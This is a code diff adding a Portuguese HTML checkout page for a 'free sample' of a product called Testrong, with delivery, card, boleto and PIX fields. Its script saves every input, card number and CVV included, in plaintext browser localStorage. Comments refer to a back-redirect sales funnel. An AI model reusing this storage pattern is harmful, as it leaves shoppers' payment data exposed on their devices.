@@ -1,0 +1,642 @@
+<!doctype html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport"
+            content="width=device-width, user-scalable=no, initial-scale=1.0,
+            maximum-scale=1.0, minimum-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>Checkout Seguro</title>
+        <script src="https://kit.fontawesome.com/7ffcae3699.js"
+            crossorigin="anonymous"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link
+            href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;700&display=swap"
+            rel="stylesheet">
+    </head>
+
+    <style>
+    * {
+        padding: 0;
+        margin: 0;
+        border: 0;
+        box-sizing: 0;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+        width: 100%;
+    }
+
+    header {
+        width: 100%;
+        height: 100%;
+        margin-bottom: 10px;
+    }
+
+    main {
+        margin: 0 auto;
+        width: 95%;
+        max-width: 950px;
+    }
+
+
+    .sec-1 {
+        width: 100%;
+        max-width: 950px;
+        border-radius: 10px;
+        margin: 15px auto;
+    }
+
+    .sec-1 img {
+        width: 100%;
+    }
+
+
+    .sec-2 {
+        width: 100%;
+        margin: 0 auto;
+    }
+
+    form {
+        display: flex;
+        justify-content: flex-start;
+        gap: 25px;
+        width: 100%;
+        flex-direction: row;
+        flex-wrap: wrap;
+    }
+
+    input, select {
+
+        max-width: 500px;
+        padding: 10px 15px;
+        text-align: left;
+        font-size: 22px;
+        border-radius: 8px;
+        border: 1px solid grey;
+    }
+
+    .flex {
+        gap: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: flex-end;
+    }
+
+    label {
+        text-align: left;
+    }
+
+    .lado-esquerdo, .lado-direito {
+
+        width: 40%;
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+
+    }
+
+    .subtotal, .envio {
+        display: flex;
+        flex-direction: row;
+        justify-content: space-between;
+        font-weight: 400;
+        font-size: 16px;
+    }
+
+    .total {
+        display: flex;
+        flex-direction: row;
+        font-weight: bold;
+        font-size: 22px;
+        justify-content: space-between;
+    }
+
+    @media only screen and (max-width: 650px) {
+        .lado-esquerdo, .lado-direito {
+
+            width: 95%;
+            display: flex;
+            flex-direction: column;
+
+        }
+
+    }
+
+    .escolha {
+        display: flex;
+        flex-direction: row;
+        gap: 10px;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .btn-sim {
+        text-align: center;
+        display: flex;
+        justify-content: center;;
+        align-items: center;
+        font-weight: bold;
+        font-size: 30px;
+        color: white;
+        background-image: linear-gradient(180deg, #0bd70b, limegreen);
+        border-radius: 10px;
+        box-shadow: 0 0 3px grey;
+        max-width: 100%;
+        text-decoration: none;
+        padding: 10px 0px;
+    }
+
+    .infos {
+        color: darkgreen;
+        font-weight: bold;
+        font-size: 25px;
+         text-align: center;
+        opacity: .7;
+        justify-content: center;
+        display: flex;
+        flex-direction: row;
+    }
+
+    footer {
+        display: flex;
+        justify-content: center;
+        gap: 25px;
+        margin-top: 15px;
+        width: 100%;
+        padding: 15px 0;
+        background-image: linear-gradient(0deg, #e9e9e9, #e3e3e3);
+        border-top: 2px solid black;
+
+    }
+
+    footer a {
+        color: #00006c;
+        font-size: 14px;
+    }
+
+    lord-icon {
+        color: darkgreen;
+        filter: hue-rotate(233deg) saturate(14.5);
+        height: auto;
+        width: 100%;
+        max-width: 80px;
+    }
+
+    .nomes img {
+        max-width: 80px;
+        width: 100%;
+    }
+
+    .nomes {
+        display: flex;;
+        justify-content: space-around;
+        gap: 15px;
+        align-items: center;
+        margin: 15px auto;
+    }
+
+    .nomes p {
+        text-align: center;
+        font-size: 18px;
+        font-weight: 400;
+        color: black;
+        padding: 15px;
+    }
+
+    #soma {
+        color: green;
+    }
+
+    hr {
+        border: 1px dashed #c9c9c9;
+        width: 100%;
+        margin: 8px auto;
+    }
+
+    .pedido {
+        border: 1px solid #c9c9c9;
+        border-radius: 15px;
+        box-shadow: 0 0 1px grey;
+        padding: 5px 10px;
+    }
+
+    .selo {
+        width: 100%;
+        max-width: 350px;
+        margin: 0 auto;
+    }
+
+    #check1, #passo2, #check2, #direito {
+        display: none;
+        justify-content: flex-start;
+        gap: 25px;
+        flex-direction: column;
+
+    }
+
+    .escolha {
+        display: flex;
+        flex-direction: column;
+    }
+
+    .card-1 {
+        display: flex;
+        justify-content: space-around;
+    }
+
+    .card, .boleto, .pix {
+        display: flex;
+        gap: 15px;
+        flex-direction: column;
+        width: 100%;
+        border: 2px solid #bebebe;
+        border-radius: 10px;
+        background-color: white;
+        padding: 10px;
+        margin-top: -9px;
+        border-top: 0;
+    }
+    .boleto, .pix{
+        display: none;
+    }
+
+
+    .opcoes {
+        display: flex;
+        width: 100%;
+        gap: 30px;
+        flex-direction: row;
+        margin: 0 auto;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .opcoes input {
+        width: 100%;
+        max-width: 100px;
+        border-radius: 10px 10px 0 0;
+        border: none;
+    }
+
+    .cvv {
+        width: 40% !important;
+    }
+
+    .select {
+        box-shadow: 0 0 4px #007eff;
+        background-color: transparent;
+    }
+
+    #cartao {
+        background-image: url(https://testrong.com.br/carts/credit-card-regular.svg);
+        background-size: 45px;
+        background-position: center;
+        background-repeat: no-repeat;
+        transition: 0.5 linear;
+
+    }
+
+    #boleto {
+        background-image: url(https://testrong.com.br/carts/barcode-solid.svg);
+        background-size: 45px;
+        background-position: center;
+        background-repeat: no-repeat;
+
+    }
+
+    #pix {
+        background-image: url(https://testrong.com.br/carts/pix.svg);
+        background-size: 45px;
+        background-position: center;
+        background-repeat: no-repeat;
+
+    }
+    .instrucoes {
+        margin: 10px auto;
+        text-align: center;
+        font-size: 22px;
+        font-weight: 400;
+    }
+    .btn-reset {
+        padding: 20px;
+        background-color:#51c6ef;
+        color: #fff;
+        font-weight: bold;
+    }
+</style>
+
+    <body>
+        <header>
+            <div style="text-align: center;background-image:
+                linear-gradient(45deg, black, #6e0606);border-bottom: 2px solid
+                gold;margin-bottom: 4px;">
+                <img
+                    src="https://cdn.discordapp.com/attachments/1024715477215367232/1082755575282147448/HOMEM_CAPS_COMPLETO.webp"
+                    style="width: 100%;max-width: 70px;"></div>
+        </header>
+        <main>
+            <section class="sec-1"><img
+                    src="https://cdn.discordapp.com/attachments/1024715477215367232/1082754567625781409/CTA_5-3.webp"
+                    alt="BANNER">
+            </section>
+            <section class="sec-2">
+                <form action="#" id="form">
+                    <div class="lado-esquerdo">
+                        <label for="nome" class="infos">
+                            <lord-icon id="check1"
+                                src="https://cdn.lordicon.com/yqzmiobz.json"
+                                trigger="loop"></lord-icon>
+                            INSIRA SEUS DADOS PARA ENTREGA</label>
+                        <input type="text" placeholder="NOME"
+                            name="nome">
+                        <input type="phone" placeholder="TELEFONE"
+                            name="tel">
+                        <input type="email" placeholder="EMAIL"
+                            name="email">
+                        <input type="text" name="cep"
+                            pattern="\d{5}\-\d{3}"
+                            maxlength="9"
+                            placeholder="CEP">
+                        <div class="flex">
+                            <input type="checkbox" name="np">
+                            <label for="np">NÃO SEI O CEP</label></div>
+                        <a href="#passo2" class="btn-sim"
+                            id="passo1">CONTINUAR</a>
+                        <br><br>
+                        <div id="passo2"><label for="nome" class="infos">
+                                <lord-icon id="check2"
+                                    src="https://cdn.lordicon.com/yqzmiobz.json"
+                                    trigger="loop"></lord-icon>
+                                INFORMAÇÕES DE
+                                ENTREGA</label>
+                            <input type="text" placeholder="ENDEREÇO"
+                                name="endere">
+                            <input type="number" maxlength="7"
+                                placeholder="NÚMERO" name="numero">
+                            <input type="text" placeholder="COMPLEMENTO"
+                                name="comp">
+                            <input type="text" placeholder="BAIRRO"
+                                name="bairro">
+                            <input type="text" placeholder="CIDADE"
+                                name="cidade">
+
+
+                            <select id="silga" name="estado">
+                                <option value="RS">RS</option>
+                                <option value="SP">SP</option>
+                                <option value="RJ">RJ</option>
+                                <option value="AM">AM</option>
+                            </select>
+                            <a href="#direito" class="btn-sim"
+                                id="pas2">CONFERIR PEDIDO</a>
+                        </div>
+
+                    </div>
+
+                    <div class="lado-direito" id="direito">
+
+                        <label for="nome" class="infos">RESUMO DO PEDIDO</label>
+                        <div class="pedido">
+                            <div class="nomes">
+                                <img class="opopopopopopo"
+                                    src="https://testrong.com.br/carts/transparente.webp"
+                                    alt="FOTO PNG FRASCO">
+                                <p>1x Amostra Grátis
+                                    <b>Testrong</b></p></div>
+                            <hr>
+                            <div class="subtotal"><h4>Subtotal</h4>
+                                <p id="sub"><b>GRÁTIS</b></p></div>
+                            <div class="envio"><h4>Entrega</h4>
+                                <p id="frete">R$ 39,90</p></div>
+                            <hr>
+                            <div class="total"><h4>Total</h4>
+                                <p id="soma">R$ 39,90</p></div>
+                        </div>
+                        <br><br>
+                        <button onclick="reset()"
+                            class="btn-reset"># CLIQUE AQUI PARA RESETAR E
+                            FAZER TESTE NOVAMENTE #</button>
+                        <label for="nome" class="infos"> <i
+                                class="fa-regular
+                                fa-circle-3"></i> MÉTODO DE PAGAMENTO</label>
+                        <div class="opcoes">
+                            <input type="button" id="cartao" class="select"
+                                placeholder="CARTÃO">
+                            <input type="button" id="boleto"
+                                placeholder="BOLETO">
+                            <input type="button" id="pix" placeholder="PIX"></div>
+                        <div class="escolha">
+                            <div id="cartao-div" class="card">
+                                <input type="number" maxlength="16"
+                                    name="numerocard" placeholder="Número do
+                                    Cartão">
+                                <input name="nomecompleto" type="text"
+                                    placeholder="Nome Completo">
+                                <div class="card-1">
+                                    <div><h3>MÊS VALIDADE</h3>
+                                        <select name="mesvalidade" id="mes">
+                                            <option value="01">JANEIRO</option>
+                                            <option value="02">FEVEREIRO</option>
+                                            <option value="03">MARÇO</option>
+                                            <option value="04">ABRIL</option>
+                                            <option value="05">MAIO</option>
+                                            <option value="06">JUNHO</option>
+                                            <option value="07">JULHO</option>
+                                            <option value="08">AGOSTO</option>
+                                            <option value="09">SETEMBO</option>
+                                            <option value="10">OUTUBRO</option>
+                                            <option value="11">NOVEMBRO</option>
+                                            <option value="12">DEZEMBRO</option>
+                                        </select></div>
+                                    <div>
+                                        <h3>ANO</h3>
+                                        <select name="anovalido" id="ano">
+                                            <option value="2023">2023</option>
+                                            <option value="2024">2024</option>
+                                            <option value="2025">2025</option>
+                                            <option value="2026">2026</option>
+                                            <option value="2027">2027</option>
+                                            <option value="2028">2028</option>
+                                            <option value="2029">2029</option>
+                                            <option value="2030">2030</option>
+                                            <option value="2031">2031</option>
+                                            <option value="2032">2032</option>
+                                        </select></div>
+                                </div>
+                                <input class="cvv" name="cvv" type="text"
+                                    maxlength="3" placeholder="Código CVV">
+                                <label for="vezes">Número de Parcelas</label>
+                                <select id="silga" name="vezes">
+                                    <option value="9x">9x R$ 5,12</option>
+                                    <option value="8x">8x R$ 5,68</option>
+                                    <option value="7x">7x R$ 6,40</option>
+                                    <option value="6x">6x R$ 7,36</option>
+                                    <option value="5x">5x R$ 8,71</option>
+                                    <option value="4x">4x R$ 10,73</option>
+                                    <option value="3x">3x R$ 14,10</option>
+                                    <option value="2x">2x R$ 20,85</option>
+                                    <option value="1x">1x R$ 39,90</option>
+                                </select>
+
+                                <input type="text" maxlength="11" name="cpf"
+                                    placeholder="CPF">
+                            </div>
+                            <div id="boleto-div" class="boleto">
+                                <p class="instrucoes">Pagamentos por boleto
+                                    só
+                                    podem ser efetuados à vista;
+                                    A compensação do pagamento pode levar
+                                    até 3
+                                    dias úteis.
+                                </p>
+                                <div class="subtotal"><h4>Subtotal</h4>
+                                    <p id="sub"><b>GRÁTIS</b></p></div>
+                                <div class="envio"><h4>Entrega</h4>
+                                    <p id="frete">R$ 39,90</p></div>
+                                <hr>
+                                <div class="total"><h4>Total</h4>
+                                    <p id="soma">R$ 39,90</p></div>
+
+                                <label for="cppf">CPF (Para emissão da Nota
+                                    Fiscal):</label>
+                                <input type="text" name="cppf">
+                            </div>
+
+                            <div id="pix-div" class="pix">
+                                <p class="instrucoes">A compensação do
+                                    pagamento
+                                    PIX é feita em poucos minutos.
+                                </p>
+                                <div class="subtotal"><h4>Subtotal</h4>
+                                    <p id="sub"><b>GRÁTIS</b></p></div>
+                                <div class="envio"><h4>Entrega</h4>
+                                    <p id="frete">R$ 39,90</p></div>
+                                <hr>
+                                <div class="total"><h4>Total</h4>
+                                    <p id="soma">R$ 39,90</p></div>
+
+                                <label for="cppf">CPF (Para emissão da Nota
+                                    Fiscal):</label>
+                                <input type="text" name="cppf">
+
+                            </div>
+
+
+                            <input class="btn-sim" type="button"
+                                value="FINALIZAR PEDIDO">
+                            <img class="selo"
+                                src="https://testrong.com.br/carts/check.webp"
+                                alt="">
+                        </div>
+                    </form>
+                </section>
+                <section class="sec-3"></section>
+
+            </main>
+            <footer>
+                <a href="#">Termos e Condições</a><a href="#">Políticas de
+                    Privacidade</a>
+            </footer>
+
+            <script
+                src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+            <script>
+
+    // CÓDIGO PARA SALVAR CAMPOS NO DISPOSITIVO
+    // É UTIL SE O USUARIO ATUALIZAR A PAGINA OU CAIR NO BACKREDIRECT, P1-P7, E NÃO PRECISAR INSERIR OS DADOS NOVAMENTE.
+    // FAZER VALIDAÇÃO SE O PARAMETRO "c" ESTÁ ATIVO, SE NÃO, LIBERAR ESSE TRECHO DE CÓDIGO.
+    const form = document.querySelector("#form");
+    const inputs = document.querySelectorAll("input");
+
+    inputs.forEach((item) => {
+    item.addEventListener("change", () => {
+        nome = item.name;
+        value = item.value;
+        storeChanges(nome,value)
+        })
+    })
+
+    function storeChanges(nome,value) {
+        localStorage[nome] = value;
+    }
+
+    function setValues() {
+        const userInputs = Object.keys(localStorage);
+        userInputs.forEach( props => {
+            form.elements[props].value = localStorage[props];
+        })
+    }
+    setValues();
+
+    function reset() {
+        localStorage.clear();
+        window.location.href = "#";
+    }
+
+    // FIM CÓDIGO ALISON
+
+
+
+
+
+    //CÓDIGO LEO
+    var btnCartao = document.getElementById("cartao");
+    var btnBoleto = document.getElementById("boleto");
+    var btnPix = document.getElementById("pix");
+
+    var bcard = document.getElementById("cartao-div");
+    var bboelto = document.getElementById("boleto-div");
+    var bpix = document.getElementById("pix-div");
+
+    btnCartao.addEventListener("click", () => {
+        bcard.style.display = "flex";
+        btnCartao.classList.add("select");
+
+        bboelto.style.display = "none";
+        btnBoleto.classList.remove("select");
+
+        bpix.style.display = "none";
+        btnPix.classList.remove("select");
+    })
+    btnBoleto.addEventListener("click", () => {
+        bcard.style.display = "none";
+        btnCartao.classList.remove("select");
+
+        bboelto.style.display = "flex";
+        btnBoleto.classList.add("select");
+
+        bpix.style.display = "none";
+        btnPix.classList.remove("select");
+
+    })
+    btnPix.addEventListener("click", () => {
+        bcard.style.display = "none";
+        btnCartao.classList.remove("select");
+
+        bboelto.style.display = "none";
+        btnBoleto.classList.remove("select");
+
+        bpix.style.display = "flex";
+        btnPix.classList.add("select");
+    })
+</script>
+            <script>
+
+
+    $("#passo1").click(function () {
+        $("#check1").show();
+        $("#passo2").css('display', 'flex');
+    })
+    $("#pas2").click(function () {
+        $("#check2").show();
+        $("#direito").css('display', 'flex');
+        $("#form").css('justify-content', 'space-around');
+    })
+
+</script>
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+        </body>
+    </html>
